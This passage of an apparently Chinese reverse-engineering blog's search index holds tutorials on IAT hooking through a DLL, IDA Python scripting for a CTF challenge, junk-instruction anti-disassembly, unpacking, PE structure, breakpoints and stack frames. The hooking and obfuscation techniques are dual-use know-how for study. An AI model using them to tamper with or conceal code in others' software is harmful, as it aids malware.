(pCurrent-&gt;Characteristics &amp;&amp; pCurrent-&gt;FirstThunk != NULL) &#123; dwTemp = pCurrent-&gt;FirstThunk + (DWORD)GetModuleHandle(NULL); pFirstThunk = (DWORD*)dwTemp; //遍历子表 while (*pFirstThunk != NULL) &#123; //如果是我们的函数地址 if (*pFirstThunk == (DWORD)MyMessageBox) &#123; //找到要修改的导入表了，修改内存保护属性.写入我们新的函数地址. DWORD oldProtected; VirtualProtect(pFirstThunk, 0x1000, PAGE_EXECUTE_READWRITE, &amp;oldProtected); dwTemp = (DWORD)GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;), &quot;MessageBoxA&quot;); memcpy(pFirstThunk, (DWORD*)&amp; dwTemp, 4); //将变量中保存的函数地址拷贝到导入表中. VirtualProtect(pFirstThunk, 0x1000, oldProtected, &amp;oldProtected); &#125; pFirstThunk++; //继续遍历. &#125; pCurrent++; //每次是加一个导入表结构. &#125;&#125;BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: SetIatHook(); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;","categories":[{"name":"Hook框架","slug":"Hook框架","permalink":"https://e1ectr0nlc.github.io/categories/Hook%E6%A1%86%E6%9E%B6/"}],"tags":[]},{"title":"IDA python编写","slug":"IDA-python编写","date":"2022-08-11T16:00:00.000Z","updated":"2024-05-13T12:20:08.830Z","comments":true,"path":"2022/08/12/IDA-python编写/","permalink":"https://e1ectr0nlc.github.io/2022/08/12/IDA-python%E7%BC%96%E5%86%99/","excerpt":"t听学长说IDA python很有用，今天就来抽空学习一下。","text":"t听学长说IDA python很有用，今天就来抽空学习一下。 环境例子下载：[jocker.exe](https://buuoj.cn/challenges#[网鼎杯 2020 青龙组]) 工具 版本 python 3.11.3 ida pro 7.7 IDA python介绍IDA在7.5版本更新后支持python3，原来的很多函数都有了改变，接下来就来介绍一下改变前后的函数以及它的作用。 获取地址 函数作用 函数 获取光标当前地址 idc.here() 或 idc.get_screen_ea() 获取最小地址（可以使用的） ida_ida.inf_get_min_ea() 获取最大地址（可以使用的） ida_ida.inf_get_max_ea() 获取所选范围的起始地址 idc.read_selection_start() 获取所选范围的结束地址 idc.read_selection_end() 判断地址是否存在 idaapi.BADADDR 这些函数都不需要参数 代码如下，我选中的区域就是部分main函数 12345678910print(hex(idc.here()))print(hex(ida_ida.inf_get_max_ea()))print(hex(ida_ida.inf_get_min_ea()))print(hex(idc.read_selection_start()))print(hex(idc.read_selection_end())) if idc.here() == idaapi.BADADDR: print(&quot;不存在&quot;)else: print(&quot;存在&quot;) note warning 注意 使用idc.read_selection_start()和idc.read_selection_end()是需要使用光标选中两行及以上的，不然就会返回0xffffffff 获取地址的值 获取地址的数值 以1字节为单位获取值 idc.get_wide_byte(addr) 以2字节(字)的单位获取值 idc.get_wide_word(addr) 以4字节的单位获取值 idc.get_wide_dword(addr) 以8字节的单位获取值 idc.get_qword(addr) 得到运行断点之前的寄存器的值 ea&#x3D;get_reg_value(“eax”) 代码如下 1234567import idc ea = idc.get_screen_ea()print(hex(idc.get_wide_byte(ea)))print(hex(idc.get_wide_word(ea)))print(hex(idc.get_wide_dword(ea)))print(hex(idc.get_qword(ea))) 修改指令的值 作用 函数 修改addr地址的值为value.每次修改1个字节 ida_bytes.patch_byte(addr,value) 每次修改2个字节 ida_bytes.patch_word(addr,value) 每次修改4个字节 ida_bytes.patch_Dword(addr,value) 每次修改8个字节 ida_bytes.patch_Qword(addr,value) 测试代码 123456ea = idc.get_screen_ea()value = idc.get_wide_byte(ea)print(&quot;未修改=&#123;&#125;&quot;.format(hex(value)))ida_bytes.patch_byte(ea,0x90)value = idc.get_wide_byte(ea)print(&quot;修改后=&#123;&#125; &quot;.format(hex(value))) 段操作 作用 函数 获取段的名字（参数为当前的地址） idc.get_segm_name(addr) 获取段的开始地址 idc.get_segm_start(addr) 获取段的结束地址 idc.get_segm_end(addr) 获取第一个段 idc.get_first_seg(addr) 获取下一个段 idc.get_next_seg(addr) 返回一个列表记录所有段的地址 idautil.Segments() 代码 12345for seg in idautils.Segments(): segname = idc.get_segm_name(seg) segstart = idc.get_segm_start(seg) segend = idc.get_segm_end(seg) print(&quot;段名 = &#123;&#125; 起始地址= &#123;&#125; 结束地址 = &#123;&#125; &quot;.format(segname,hex(segstart),hex(segend))); 函数操作 作用 函数 获取指定地址之间的所有函数 idautils.Functions(startaddr,endaddr) 获取指定地址的函数名 idc.get_func_name(addr) 获取函数的注释 get_func_cmt(addr, repeatable) repeatable:0&#x2F;1 0是获取常规注释 1是获取重复注释 设置函数注释 idc.set_func_cmt(ea, cmt, repeatable) 弹出框框要求用户进行选择 参数则是信息 idc.choose_func(title) 返回: addr 距离函数的偏移形式 idc.get_func_off_str(addr) 寻找函数结尾,如果函数存在则返回结尾地址,否则返回BADADDR idc.find_func_end(addr) 设置函数结尾 ida_funcs.set_func_end(ea, newend) newend:新的结束地址 设置函数开头 ida_funcs.set_func_start(addr, newstart) 设置地址处的名字 idc.set_name(ea, name, SN_CHECK) Ex函数也使用set_name 获取首个函数 idc.get_prev_func(ea) 获取下一个函数 idc.get_next_func(ea) 代码： 12345678910111213141516for seg in idautils.Segments(): segname = idc.get_segm_name(seg) segstart = idc.get_segm_start(seg) segend = idc.get_segm_end(seg) if (segname == &#x27;.text&#x27;): for funcaddr in Functions(segstart,segend): funname = idc.get_func_name(funcaddr) funend = idc.find_func_end(funcaddr) funnext = idc.get_next_func(funcaddr) funnextname = idc.get_func_name(funnext) print(&quot;当前函数名 = &#123;&#125; 当前结束地址 = &#123;&#125; 下一个函数地址 = &#123;&#125; 下一个函数名= &#123;&#125; &quot;.format(funname,hex(funend),hex(funnext),funnextname)) ea = idc.get_screen_ea()funnextoffset = idc.get_func_off_str(ea)print(&quot;当前选择地址距离当前函数的偏移为: &#123;&#125; &quot;.format(funnextoffset)) 练手网鼎杯 2020 青龙组 Jocker还是最开始的那道程序 可以看到encrypt函数去异或0x41，这就是一个很典型的SMC(self modifying code)操作。我们要做的就是让这段for循环运行起来，可以动态调试或者写ida python脚本运行。这里不再讲动态调试，我们要做的就是找到encrypt函数的地址，接着去获取该地址处的值，异或0x41来还原即可。 encrypt的地址：0x41500 脚本： 1234addr = 0x401500for i in range(187): value = idc.get_wide_byte(addr + i) ida_bytes.patch_byte(addr + i, value ^ 0x41) 之后选中整段函数，重新分析（快捷键C），之后生成函数（快捷键P），即可还原函数","categories":[{"name":"脚本工具","slug":"脚本工具","permalink":"https://e1ectr0nlc.github.io/categories/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/"}],"tags":[]},{"title":"花指令初探","slug":"代码保护--花指令","date":"2021-10-11T16:00:00.000Z","updated":"2024-05-12T13:37:47.044Z","comments":true,"path":"2021/10/12/代码保护--花指令/","permalink":"https://e1ectr0nlc.github.io/2021/10/12/%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4--%E8%8A%B1%E6%8C%87%E4%BB%A4/","excerpt":"花指令的作用是用来隐藏反汇编后的代码，对于动态调试来说无法隐藏，但是对于静态分析来说就成为必须绕过去的一个问题。","text":"花指令的作用是用来隐藏反汇编后的代码，对于动态调试来说无法隐藏，但是对于静态分析来说就成为必须绕过去的一个问题。 花指令如何实现代码隐藏花指令能成功干扰反编译器识别代码，主要是与反编译器的实现技术有关。主流反编译器使用两种方法进行反汇编操作，分别是线性扫描和递归下降。 线性扫描之所以叫线性扫描，就是说像一条线一样从头扫到尾。线性扫描反汇编从一个代码段的第一个字节开始，以线性模式扫描整个代码段，逐条反汇编每条指令，直到完成整个代码段 优点：能够完全覆盖程序的所有代码段 缺点：没有考虑到代码中可能混有数据 递归下降递归下降反汇编强调控制流的概念。根据一条指令是否被另一条指令引用来决定是否进行反汇编。 优点：它具有区分代码与数据的强大能力。作为一种基于控制流的算法，它很少会在反汇编过程中错误地将数据值作为代码处理。 缺点：它无法处理间接代码路径，如利用指针表来查找目标地址的跳转或调用。 而花指令就是利用这两种方法的缺点来实现。我觉得大家反编译的工具一般是IDA Pro，在设计这类花指令时要通过构造 必然条件 或者 互补条件，使得程序在实际执行时绕过垃圾数据，这样不会影响程序正常执行 常见花指令相同目标的跳转指令在反汇编过程中遇到 jz（跳转到目标地址为零的情况下执行）和 jnz（跳转到目标地址不为零的情况下执行）指令时，如果它们的目标地址相同，那么程序实际上就是要执行一个无条件跳转，相当于 jmp 指令。然而，IDA Pro 在反汇编时可能会误将 jnz 后面的指令也反汇编出来，尽管实际上这些指令并不会被执行，因为程序在遇到 jnz 指令时已经跳转了。这种情况下，如果后面紧跟着的是一些字节指令（如 call 或 jmp 指令），IDA Pro 可能会将它们错误地解释为与 jnz 相关的指令，导致反汇编结果出现问题。 例如假设原始机器码如下 1234574 03 ; jz 目标地址为当前地址 + 375 01 ; jnz 目标地址为当前地址 + 1E8 58 ; call 目标地址为当前地址 + 58C3 ; ret90 90 ; nop 这里的call指令即为无用数据，只需要将call指令转为data数据再反编译即可 固定条件的跳转指令当条件满足时，相应的判断语句后面的代码将会执行，而当条件不满足时，与之对应的代码则不会执行。如果设置了一个永真语句，后面的代码一定会执行，若是将要执行的代码后继续跟无条件跳转语句，ida则会识别出错。 例如 123433 C0 ; xor eax, eax74 01 ; jz 目标地址为当前地址 + 1E9 58 ; jmp 目标地址为当前地址 + 58C3 ; ret 在这个例子中xor结束zf标志位一定会被置1，jz跳转成立，而jmp则不会执行。更改方法是将jmp 这行代码nop或改为data 函数跳转函数调用时将调用指令的下一条指令地址压栈，然后跳转到函数位置执行，相当于：PUSH 下一条指令地址、MOV EIP,函数位置，相应地，函数返回时将函数调用时的压栈地址恢复给EIP，相当于POP EIP。如果破环了其中的堆栈平衡，ida就会报错。 例如： 1234call label ;调用label函数label: ;函数体add [esp],5 ;栈顶加5ret ;返回 至于栈顶的返回地址要加多少，这取决于跨过语句的长度。此处构造RET返回的位置和正常RET返回的位置相差5个字节，因此栈顶数据加上5个字节","categories":[{"name":"代码保护","slug":"代码保护","permalink":"https://e1ectr0nlc.github.io/categories/%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4/"}],"tags":[]},{"title":"程序加壳与脱壳","slug":"程序加壳与脱壳","date":"2021-10-11T16:00:00.000Z","updated":"2024-05-12T12:28:23.567Z","comments":true,"path":"2021/10/12/程序加壳与脱壳/","permalink":"https://e1ectr0nlc.github.io/2021/10/12/%E7%A8%8B%E5%BA%8F%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3/","excerpt":"程序加壳主要分为压缩壳、加密壳，多层壳等等，目的都是为了隐藏程序真正的入口点OEP，防止逆向人员轻松分析程序代码。","text":"程序加壳主要分为压缩壳、加密壳，多层壳等等，目的都是为了隐藏程序真正的入口点OEP，防止逆向人员轻松分析程序代码。 概念壳最开始的目的是为了让逆向分析人员无法轻易获取程序的入口函数，在静态分析时也能隐藏内部代码， 属于代码保护技术。 加壳软件与查壳软件 加壳：ASPACK，UPX， PEcompact，PE-PACK； PETITE NEOLITE等 一般用来加壳的也可以用来脱壳 查壳： Fi ，GetTyp ，peid ，pe-scan等 如何识别OEP这里只分享笔者遇到过的加壳软件中的OEP特征。 关键词PUSHAD，将所有寄存器压入栈中，POPAD与PUSHAD相对应，将所有寄存器弹出，一般运行到POPAD说明OEP已经不远了。 观察地址，一般壳程序的地址比源程序的地址要大，也就是源程序在壳程序的上方，当经过了一个大跳转到达原本调试的地址上方，同时观察到有PUSH EBP等开辟栈帧的语句出现，大概率已经到达了OEP 脱壳方法当遇到无法使用工具帮助我们解决壳时，可以使用手脱方法进行脱壳。加壳相当于在程序外套了另外一层程序，当程序运行起来时壳先获取到程序控制权，将壳程序运行结束（自解密阶段），再接着运行原程序，这时程序就执行到了OEP下，我们可以在这个时机下dump源程序。 单步跟踪这是最笨的方法，在调试器中单步运行，不断单步步入或步过，直到到达OEP当中。 ESP定律原理是利用了程序堆栈平衡。在程序自解密时需要先保存寄存器中的值，会进行压栈操作，而当自解密完成需要还原现场时，会将原来压栈的寄存器都弹出，原程序代码恢复。此时硬件断点触发。然后在程序当前位置，只需要少许单步跟踪，就很容易到达正确的OEP位置。 关键词搜索根据所要脱壳程序的脱壳特征，定位到距离OEP最近的汇编，下断点，再运行程序到OEP之后dump。例如UPX可以定位汇编到popad附近，OEP距离popad的距离很近","categories":[{"name":"代码保护","slug":"代码保护","permalink":"https://e1ectr0nlc.github.io/categories/%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4/"}],"tags":[]},{"title":"Pe文件结构","slug":"PE文件结构","date":"2021-09-19T16:00:00.000Z","updated":"2024-05-12T12:51:17.063Z","comments":true,"path":"2021/09/20/PE文件结构/","permalink":"https://e1ectr0nlc.github.io/2021/09/20/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/","excerpt":"可执行文件是指可以由操作系统直接加载执行的文件，而PE文件是Windows下的可执行文件。我们既然要学习PE文件，了解文件格式就是必须的。我们一般称具有PE结构的文件为PE文件，常见的有EXE、DLL。一个完整的PE文件主要有四部分组成：DOS头，NT头，节表以及节数据。","text":"可执行文件是指可以由操作系统直接加载执行的文件，而PE文件是Windows下的可执行文件。我们既然要学习PE文件，了解文件格式就是必须的。我们一般称具有PE结构的文件为PE文件，常见的有EXE、DLL。一个完整的PE文件主要有四部分组成：DOS头，NT头，节表以及节数据。 PE文件结构说明DOS头DOS头 是用来兼容 MS-DOS 操作系统的，目的是当这个文件在 MS-DOS 上运行时提示一段文字：This program cannot be run in DOS mode. 还有一个目的，就是指明 NT 头在文件中的位置。 NT头NT头 包含 windows PE 文件的主要信息，其中包括一个 ‘PE’ 字样的签名，PE文件头（IMAGE_FILE_HEADER）和 PE可选头（IMAGE_OPTIONAL_HEADER32）。 节表节表是 PE 文件后续节的描述，windows 根据节表的描述加载每个节。 节数据每个节实际上是一个容器，可以包含 代码、数据 等等，每个节可以有独立的内存权限，比如代码节默认有读&#x2F;执行权限，节的名字和数量可以自己定义。 DOS头首先看到文件前两个字节4D 5A也就是”MZ”，“MZ”是MS-DOS开发者之一的马克·茨柏克沃斯基（Mark Zbikowski）的姓名首字母缩写。PE文件的第一个字节位于一个传统的MS-DOS头部，叫作IMAGE_DOS_HEADERDOS，主要是为了向后兼容以前的DOS系统，DOS部分可以分为DOS MZ文件头（IMAGE_DOS_HEADER）和DOS块（DOS Stub）。DOS头的总长为0x40h，DOS块总长不定。 123456789101112131415161718192021typedef struct _IMAGE_DOS_HEADER &#123; // DOS .EXE header WORD e_magic; // Magic number WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // File address of new exe header &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; 在DOS头我们只需要重点关注e_magic和e_lfanew即可。前者就是MZ标识，后者指向PE结构开始的地方。 NT头NT头由PE文件头标志，标准PE头，扩展PE头三部分组成。PE文件头标志是50 40 00 00，也就是PE，我们从结构体的角度看一下PE文件头的详细信息。 PE文件头标识12345typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; //PE文件头标志 =&gt; 4字节 IMAGE_FILE_HEADER FileHeader; //标准PE头 =&gt; 20字节 IMAGE_OPTIONAL_HEADER32 OptionalHeader; //扩展PE头 =&gt; 32位下224字节(0xE0) 64位下240字节(0xF0)&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; 这是用来判断是否是一个有效的PE文件的标识 我们使用十六进制工具载入一个EXE文件查看 在第四排四个字节指向的地址为PE头开始的地方，50 45也就是PE，在PE标识后存在机器码用来标识程序为x64(0x8664)还是x32(0x014C)，例如这里用来展示的文件就是一个64位可执行程序。 标准PE头共有20个字节 123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; //可以运行在多少位系统中 0代表任意,32位:0x14C,64位:0x8664 WORD NumberOfSections; //节的数量 DWORD TimeDateStamp; //编译器填写的时间戳 DWORD PointerToSymbolTable; //调试相关 DWORD NumberOfSymbols; //调试相关 WORD SizeOfOptionalHeader; //标识扩展PE头大小 WORD Characteristics; //文件属性 =&gt; 16进制转换为2进制根据哪些位有1,可以查看相关属性&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; 扩展PE头包含以下重要信息 所有含代码的节的总大小 所有含已初始化数据的节的总大小 所有含未初始化数据的节的大小 程序执行入口RVA 代码的节的起始RVA 数据的节的起始RVA 程序的建议装载地址 内存中的节的对齐粒度 文件中的节的对齐粒度 内存中整个PE映像尺寸 所有头＋节表的大小 导出表 导入表 资源 重定位表 调试信息 版权信息 导入函数地址表 123456789101112131415161718192021222324252627282930313233343536373839404142typedef struct _IMAGE_OPTIONAL_HEADER &#123; // // Standard fields. // WORD Magic; //PE32: 10B PE64: 20B BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; //所有含有代码的区块的大小 编译器填入 没用(可改) DWORD SizeOfInitializedData; //所有初始化数据区块的大小 编译器填入 没用(可改) DWORD SizeOfUninitializedData; //所有含未初始化数据区块的大小 编译器填入 没用(可改) DWORD AddressOfEntryPoint; //程序入口RVA DWORD BaseOfCode; //代码区块起始RVA DWORD BaseOfData; //数据区块起始RVA // // NT additional fields. // DWORD ImageBase; //内存镜像基址(程序默认载入基地址) DWORD SectionAlignment; //内存中对齐大小 DWORD FileAlignment; //文件中对齐大小(提高程序运行效率) WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; //内存中整个PE文件的映射的尺寸,可比实际值大,必须是SectionAlignment的整数倍 DWORD SizeOfHeaders; //所有的头加上节表文件对齐之后的值 DWORD CheckSum; //映像校验和,一些系统.dll文件有要求,判断是否被修改 WORD Subsystem; WORD DllCharacteristics; //文件特性,不是针对DLL文件的,16进制转换2进制可以根据属性对应的表格得到相应的属性 DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; //数据目录表,结构体数组&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; 如果想要编写一个PE解析器，那么就需要关注一下FileAlignment 以及 SizeOfHeaders 这两个成员。SizeOfHeaders 表示所有的头加上节表文件对齐之后的值，对齐的大小参考的就是 FileAlignment 成员，如果所有的头加上节表的大小为320，FileAlignment 为 200，那么 SizeOfHeaders 大小就为 400。下图中0x20000就是在内存中对齐的大小，0x400是程序在文件中的对其大小。 最后一个成员数据目录表很重要。PE扩展头的最后一个成员是IMAGE_DATA_DIRECTORY结构体，定义如下 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; 存储了导出表和导入表 导出表结构如下 12345678910111213typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; // 指针指向该导出表文件名字符串 DWORD Base; // 导出函数起始序号 DWORD NumberOfFunctions; // 所有导出函数的个数 DWORD NumberOfNames; // 以函数名字导出的函数个数 DWORD AddressOfFunctions; // 指针指向导出函数地址表RVA DWORD AddressOfNames; // 指针指向导出函数名称表RVA DWORD AddressOfNameOrdinals; // 指针指向导出函数序号表RVA&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 导出表的作用就是记载着动态链接库的一些导出信息。通过导出表，DLL文件可以向系统提供导出函数的名称、序号和入口地址等信息，以便Windows加载器通过这些信息来完成动态连接的整个过程。exe文件不存在导出表，一般存在于Dll文件中，导出 函数给别人用。不清楚Dll文件作用的可自行百度。 导入表结构如下 12345678910typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; //导入表结束标志 DWORD OriginalFirstThunk; //RVA指向一个结构体数组(INT表) &#125;; DWORD TimeDateStamp; //时间戳 DWORD ForwarderChain; // -1 if no forwarders DWORD Name; //RVA指向dll名字，以0结尾 DWORD FirstThunk; //RVA指向一个结构体数组(IAT表)&#125; IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR; .exe 文件存在导入表，就是导入函数，然后自己使用。导入表在PE文件加载时，会根据这个表里的内容加载依赖的DLL ，并填充所需函数的地址。 OriginalFirstThunk指向INT，FirstThunk指向IAT，当文件在磁盘中时，实际上 INT 和 IAT 的内容是一样的。 而当文件加载到内存中时 INT表的结构不变，而IAT表则是直接存储了函数的地址 节表节表的结构如下，整体为40个字节。存储了PE代码和数据的结构数据，指示装载系统代码段在哪里，数据段在哪里等。 在标准PE头中定义好了文件节的数目。 123456789101112131415typedef struct _IMAGE_SECTION_HEADER &#123; BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; //ASCII字符串 可自定义 只截取8个字节 union &#123; //该节在没有对齐之前的真实尺寸,该值可以不准确 DWORD PhysicalAddress; DWORD VirtualSize; &#125; Misc; DWORD VirtualAddress; //内存中的偏移地址 DWORD SizeOfRawData; //节在文件中对齐的尺寸 DWORD PointerToRawData; //节区在文件中的偏移 DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; //节的属性&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; 节数据常见的节数据：.text：代码段，是在编译或汇编结束时产生的一种块，它的内容全部是指令代码。也有的编译器将该段命名为.code.data：初始化的数据块，是初始化的数据块，包含那些编译时被初始化的变量、字符串.idata：输入表，包含其他外来dll的函数和数据信息，也就是输入表，也有人称之为导入表。.rsrc：资源数据块，包含模块的全部资源数据，如图标、菜单、位图等。.reloc：重定位表，用于保存基址的重定位表。即当装在程序不能按照连接器所指定的地址装载文件是，需要对指令或已经初始化的变量进行调整，该块中也包含了调整过程中所需要的一些数据，如果装载能够正常装在则忽略此段中的数据。.edata：导出表，是pe文件的输出表，以供其他模块使用，并不是每个pe文件都有此数据段，因为有的文件并不需要输出一些函数，该数据段常见于动态连接库文件中。.radata：存放调试目录、说明字符串，该数据块并不常见主要是用于存放一些调试信息。","categories":[{"name":"二进制基础","slug":"二进制基础","permalink":"https://e1ectr0nlc.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"}],"tags":[]},{"title":"断点","slug":"断点","date":"2021-09-19T16:00:00.000Z","updated":"2024-05-12T13:37:50.391Z","comments":true,"path":"2021/09/20/断点/","permalink":"https://e1ectr0nlc.github.io/2021/09/20/%E6%96%AD%E7%82%B9/","excerpt":"​ 断点是用于帮助程序员分析bug和调试程序的一种技术，让程序在合适的地方暂停运行，查看内存信息。最开始是只顾着用了，没有了解过背后的原理。今天就来简单了解一下背后的机制原理。","text":"​ 断点是用于帮助程序员分析bug和调试程序的一种技术，让程序在合适的地方暂停运行，查看内存信息。最开始是只顾着用了，没有了解过背后的原理。今天就来简单了解一下背后的机制原理。 软断点首先看一条指令 120x44332211 8BC3 MOV EAX, EBX#指令地址 #机器码 #汇编指令 这时我们设置一个软断点，一般我们是通过中断指令INT3来实现，设置后指令如下 120x44332211 CCC3 MOV EAX, EBX#指令地址 #机器码 #汇编指令 这里要明白一个概念：指令的机器码&#x3D;操作码+操作数 CPU在执行完INT3指令后会触发异常，此异常会使操作系统从中断向量表中调用3号中断处理程序，首先检查是否存在调试器，如果存在调试器把异常交给调试器，调试器处理结束再返回。如果调试器不处理或者就不存在调试器则异常会传递到程序自身的异常处理中（如果最后依然没处理就会进行异常的第二次分发）。 但我们平常使用INT3断点调试时，汇编指令并没有发生变化，而是维持原样，之所以我们下断点的地址处字节没有发生任何变化是因为调试器为了维持汇编代码的可读性并没有将改变后的指令进行重新反汇编。我们先用程序验证一下，随便加载一个程序,在地址0x4015CE处下一个断点。 接下来把即将运行的下一条指令改为： 1mov al , byte ptr ds:[0x4015CE] 将下完断点地址处的值读入到寄存器$al$中 当我们执行完地址0x4015B1的代码后，可以看到$al$的值为0xCC。所以当$cpu$执行到断点(0x4015CE)时就会执行0xCC（INT3指令），接着产生异常去执行函数nt!KiTrap03( )，接着会调用nt!KiDisPatchException( )函数并将异常分发给调试器，其刚执行完0xCC此时$eip$指向0xCC的下一个字节，调试器会让$eip$减一，然后$eip$重新指向0xCC（断点处）而调试器将先还原此断点处的原字节，然后使返回程序将停在此断点处等待用户的进一步操作。 我们来验证一下这个过程。 这次我们把断点处的汇编指令改为： 1mov al , byte ptr ds:[0x4015CE] 对应的原字节A0，我们运行到断点后查看寄存器EAX $al$的值等于A0，说明断点处的字节已被修复。 为了让这个断点一直生效，程序会利用单步异常来把断点处的值再改为0xCC。其在执行完断点处的指令后，会产生单步异常从而被调试器捕捉，然后调试器会将此断点处的值更改为0xCC。我们可以利用如下方法验证。 将断点后的指令改为： 1mov al , byte ptr ds:[0x4015CE] 我们在断点执行语句后看到$al$值为A0 执行后就改为0xCC 实际上，一般情况下，调试器维护了一大组调试断点，并把他们都换成了INT 3。在被运行结束后，会回填回去，并通过现在的地址判断是到了那个断点。软件断点没有数目限制。 硬断点硬件断点是通过位于 CPU 上的一组特殊寄存器来实现的，称为调试寄存器，与被调试程序无关。比如 x86 架构的 CPU 上有 8 个调试寄存器（DR0-DR7），分别用于设置和管理硬件断点。硬件断点比软件断点的功能更强，除了函数断点外，还可以数据断点，可以指定当数据被读或写时中断。硬件断点的本质就是在指定内存下断点，内存可以位于代码段（函数断点）也可以是数据段（数据断点）。可以设置事件有执行、写入、读写时中断。 DR0-DR3 负责存储硬件断点的内存地址，所以最多只能同时使用 4 个硬件断点。 DR4 和 DR5 保留使用。 DR6 为调试状态寄存器，记录上一次断点触发所产生的调试事件类型信息。 DR7 是硬件断点的激活开关，存储着各个断点的触发信息条件。 与软断点不同的是，硬件断点使用 1 号中断（INT1）实现，INT1 一般被用于硬件断点和单步事件。 CPU 每次试图执行一条指令时，都会首先检查当前指令所在地址是否被设置了有效的硬件断点，除此之外还会检查当前指令包含的操作数是否位于被设置了硬件断点的内存地址。 内存断点内存断点本质上不是一个真正的断点。当调试器设置一个内存断点时，实际上是改变一个内存区域或一个内存页的权限。操作系统对内存页会设置访问权限，可执行、可读、可写、保护页，这些访问权限可以组合。 保护页的特性可以帮助我们实现断点机制。 任何对于有页保护的区域的内存访问都会导致 CPU 暂停执行当前进程并处发一个保护页调试异常，然后我们就可以对访问缓冲取得指令代码进行仔细的检查，并判断出应用程序如何处理缓冲区中的内容。","categories":[{"name":"二进制基础","slug":"二进制基础","permalink":"https://e1ectr0nlc.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"}],"tags":[]},{"title":"栈帧","slug":"栈帧","date":"2021-09-19T16:00:00.000Z","updated":"2024-05-12T13:21:41.272Z","comments":true,"path":"2021/09/20/栈帧/","permalink":"https://e1ectr0nlc.github.io/2021/09/20/%E6%A0%88%E5%B8%A7/","excerpt":"栈作为重要的数据结构，主要用于管理程序的执行过程中的函数调用和局部变量。它通过后进先出的原则存储和管理数据，包括函数的参数、返回地址、局部变量等。","text":"栈作为重要的数据结构，主要用于管理程序的执行过程中的函数调用和局部变量。它通过后进先出的原则存储和管理数据，包括函数的参数、返回地址、局部变量等。 重要概念栈栈在数据结构中是一种运算受限的线性表，即我们只能对表尾进行操作，称之为栈顶，相对的，另一端称为栈底。它按照先进后出的原则存储数据，先进入的数据保存在栈底，后来的数据保存在栈顶。栈中的数据都是以栈帧（Stack Frame）的格式存在，栈帧是一个内存区块，存储了函数调用时所需要使用的信息。 EBP栈底指针 ESP栈顶指针 call汇编语言，调用函数时需要使用call来调用 retn函数调用结束后返回。当retn指令执行时是将esp指向地址的值弹出到EIP寄存器中，表示返回到调用函数的下一条指令。 开辟栈帧12345678910;栈帧结构PUSH EBP ;函数开始（使用EBP前先把已有值保存到栈中）MOV EBP, ESP ;保存当前ESP到EBP中（保存返回地址）... ;函数体 ;无论ESP值如何变化，EBP都保持不变，可以安全访问函数的局部变量、参数MOV ESP, EBP ;将函数的起始（返回）地址给到ESPPOP EBP ;函数返回前弹出保存在栈中的值RETN ;函数终止，返回到调用前的下一条指令 函数调用约定在栈帧的开辟中涉及到函数的调用。例如有一个函数 1int test(int a,int b); 编写代码时我们肯定理解这个函数如何传参，传几个参数。但是CPU怎么才能知道这个函数有几个参数，参数的值是什么，为了解决这些问题，计算机提供了一种被称为栈的数据结构来支持参数传递。 但是还有问题没有解决，当函数传递参数时，按照什么样的顺序传参，是从左到右还是从右到左，调用结束后如何清除堆栈，由调用者清除还是被调用者清除以及寄存器如何使用。这时就提出了函数调用约定来解决这个问题 stdcall声明的语法为： 1int __stdcall function(int a,int b); stdcall的调用约定意味着： 参数从右向左压入堆栈 